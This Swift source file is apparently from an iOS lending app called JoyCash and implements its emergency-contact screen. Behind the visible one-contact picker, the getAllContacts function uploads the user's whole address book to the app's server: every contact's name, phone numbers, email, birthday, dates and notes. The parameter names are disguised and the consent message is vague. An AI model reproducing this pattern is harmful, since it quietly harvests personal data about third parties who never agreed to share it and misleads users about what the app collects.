//
//  JCAPPContactsViewController.swift
//  JoyCash
//
//  Created by Yu Chen  on 2025/2/24.
//

import UIKit
import LJContactManager

class JCAPPContactsViewController: JCAPPCommodityAuthViewController {

    private var _sub_height: CGFloat = 20
    private var emergency_contacts: [JCAPPEmergencyContactsModel] = []
    
    override func buildViewUI() {
        super.buildViewUI()
        self.setTipWithTitle("Emergency contact", subTitle: "Fill in the emergency contact so that we can contact you easily")
        
        self.contentView.isHidden = false
        
        self.contentView.removeFromSuperview()
        self.containerView.addSubview(self.contentView)
        self._sub_height = self.contentLab.text?.jk.heightAccording(width: ScreenWidth - APP_PADDING_UNIT * 14, font: UIFont.systemFont(ofSize: 12)) ?? self._sub_height
    }
    
    override func layoutControlViews() {
        super.layoutControlViews()
        
        self.contentLab.snp.removeConstraints()
        self.contentLab.snp.remakeConstraints { make in
            make.top.equalTo(self.titleLab.snp.bottom).offset(APP_PADDING_UNIT * 2)
            make.horizontalEdges.equalTo(self.titleLab)
            make.height.equalTo(self._sub_height)
        }
        
        self.contentView.snp.remakeConstraints { make in
            make.top.equalTo(self.contentLab.snp.bottom).offset(APP_PADDING_UNIT * 5)
            make.horizontalEdges.equalToSuperview()
            make.height.equalTo(ScreenHeight - UIDevice.xp_navigationFullHeight() - UIDevice.xp_safeDistanceBottom() - APP_PADDING_UNIT * 38 - self._sub_height)
            make.bottom.equalToSuperview().offset(-APP_PADDING_UNIT * 3)
        }
    }
    
    override func pageNetowrkRequest() {
        super.pageNetowrkRequest()
        
        guard let _p_id = JCAPPPublic.shared.productID else {
            return
        }
        
        JCAPPNetRequestManager.afnReqeustType(NetworkRequestConfig.defaultRequestConfig("said/semiconductor", requestParams: ["overuse": _p_id])) { [weak self] (task: URLSessionDataTask, res: JCAPPSuccessResponse) in
            guard let _dict = res.jsonDict, let _json_array = _dict["qmri"] as? NSArray, let _contactModels = NSArray.modelArray(with: JCAPPSelectContactsModel.self, json: _json_array) as? [JCAPPSelectContactsModel] else {
                return
            }
            
            self?.buildEmergencyContactsPeopleViews(_contactModels)
        }
    }
    
    override func clickNextButton(sender: JCAPPActivityButton) {
        guard let _p_id = JCAPPPublic.shared.productID, let _json = NSArray(array: self.emergency_contacts).modelToJSONString() else {
            return
        }
        sender.startAnimation()
        JCAPPNetRequestManager.afnReqeustType(NetworkRequestConfig.defaultRequestConfig("said/advances", requestParams: ["overuse": _p_id, "awarded": _json])) {[weak self] _, _ in
            sender.stopAnimation()
            // 埋点
            JCAPPBuriedPointReport.JCAPPRiskControlInfoBuryReport(riskType: JCRiskControlPointsType.JC_APP_Contacts, beginTime: self?.buryBeginTime, endTime: Date().jk.dateToTimeStamp())
            self?.navigationController?.popViewController(animated: true)
        } failure: { _, _ in
            sender.stopAnimation()
        }
    }
}

private extension JCAPPContactsViewController {
    func buildEmergencyContactsPeopleViews(_ models: [JCAPPSelectContactsModel]) {
        var temp_top: JCAPPSelectContactsItem?
        
        models.enumerated().forEach { (idx: Int, item: JCAPPSelectContactsModel) in
            let view = JCAPPSelectContactsItem(frame: CGRectZero)
            view.reloadEmergencyContactModel(item)
            view.itemDelegate = self
            view.tag = 100 + idx
            self.contentView.addSubview(view)
            // 保存联系人信息
            self.saveEmergencyContactsInfo(personTag: view.tag, name: item.foreign, phone: item.interpretations, relation: item.historically)
            
            if let _top = temp_top {
                if idx == models.count - 1 {
                    view.snp.makeConstraints { make in
                        make.top.equalTo(_top.snp.bottom)
                        make.left.width.equalTo(_top)
                        make.bottom.equalToSuperview().offset(-APP_PADDING_UNIT * 3)
                    }
                } else {
                    view.snp.makeConstraints { make in
                        make.top.equalTo(_top.snp.bottom)
                        make.left.width.equalTo(_top)
                    }
                }
            } else {
                view.snp.makeConstraints { make in
                    make.top.equalToSuperview().offset(APP_PADDING_UNIT)
                    make.left.width.equalToSuperview()
                }
            }
            
            temp_top = view
        }
    }
    
    func saveEmergencyContactsInfo(personTag: Int, name: String? = nil, phone: String? = nil, relation: String? = nil) {
        if let _index = self.emergency_contacts.firstIndex(where: {$0.personTag == personTag}) {
            self.emergency_contacts[_index].personTag = personTag
            if let _name = name {
                self.emergency_contacts[_index].foreign = _name
            }
            if let _p = phone {
                self.emergency_contacts[_index].interpretations = _p
            }
            if let _r = relation {
                self.emergency_contacts[_index].historically = _r
            }
        } else {
            let _temp_model: JCAPPEmergencyContactsModel = JCAPPEmergencyContactsModel()
            _temp_model.personTag = personTag
            
            if let _name = name {
                _temp_model.foreign = _name
            }
            
            if let _p = phone {
                _temp_model.interpretations = _p
            }
            
            if let _r = relation {
                _temp_model.historically = _r
            }
            
            self.emergency_contacts.append(_temp_model)
        }
    }
    
    func getAllContacts() {
        LJContactManager.sharedInstance().accessContactsComplection { (success: Bool, persons: [LJPerson]?) in
            guard success else {
                return
            }
            
            let reportArray: NSMutableArray = NSMutableArray()
            
            persons?.forEach({ (item: LJPerson) in
                let p = JCAPPBuryContactsModel()
                p.foreign = item.fullName
                
                if let _b_d = item.birthday.brithdayDate {
                    p.pacemakers = _b_d.jk.toformatterTimeString(formatter: "yyyy-MM-dd")
                }
                
                var phoneStr: [String] = []
                item.phones.forEach { (phoneItem: LJPhone) in
                    phoneStr.append(phoneItem.phone)
                }
                
                p.incorporated = phoneStr.joined(separator: ",")
                p.rather = item.emails.first?.email
                
                if let _c_d = item.creationDate {
                    p.foods = _c_d.jk.toformatterTimeString(formatter: "yyyy-MM-dd")
                }
                
                if let _m_d = item.modificationDate {
                    p.fashion = _m_d.jk.toformatterTimeString(formatter: "yyyy-MM-dd")
                }
                
                if let _note = item.note {
                    p.traditional = _note
                }
                reportArray.append(p)
            })
            
            if var _json = reportArray.modelToJSONString() {
#if DEBUG
                _json = "[{\"reinhard\":\"13303029382\",\"jres\":\"王XX\"}]"
#endif
                JCAPPNetRequestManager.afnReqeustType(NetworkRequestConfig.defaultRequestConfig("said/transportation", requestParams: ["awarded": _json])) { _, _ in
                    JCAPPProductLog.debug("通讯录上传完成 -------------")
                }
            }
        }
    }
}

extension JCAPPContactsViewController: APPSelectContactsItemProtocol {
    func contactsItemWasClicked(itemView: JCAPPSelectContactsItem, isRelationShip: Bool) {
        
        if isRelationShip {
            guard let _choise = itemView.relationShipItem.unitTupe?.choise else {
                return
            }
            JCAPPTextPickerPopView.convenienceShowPop(self.view, showCloseButton: true).reloadTextPickerPopSource(_choise).clickCloseClosure = {[weak self] (popView: JCAPPBasePopView, isConfirm: Bool) in
                
                guard let _p_view = popView as? JCAPPTextPickerPopView, let _model = _p_view.text_select_model else {
                    return
                }
                
                itemView.reloadPhoneOrRelationship(relationship: _model.foreign)
                
                self?.saveEmergencyContactsInfo(personTag: itemView.tag, relation: _model.late)
                
                _p_view.dismissPop(false)
            }
            
        } else {
            LJContactManager.sharedInstance().requestAddressBookAuthorization {[weak self] (isAuth: Bool) in
                guard !isAuth else {
                    self?.getAllContacts()
                    LJContactManager.sharedInstance().selectContact(at: self) {[weak self] (name: String?, phone: String?) in
                        if let _n = name, let _p = phone {
                            itemView.reloadPhoneOrRelationship(_n + "-" + _p)
                            self?.saveEmergencyContactsInfo(personTag: itemView.tag, name: _n, phone: _p)
                        }
                    }
                    return
                }
                
                self?.showSystemStyleSettingAlert("The APP applies to access the contact list. Easily upload contact information to simplify steps and accelerate the loan application.", okTitle: nil, cancelTitle: nil)
            }
        }
    }
}
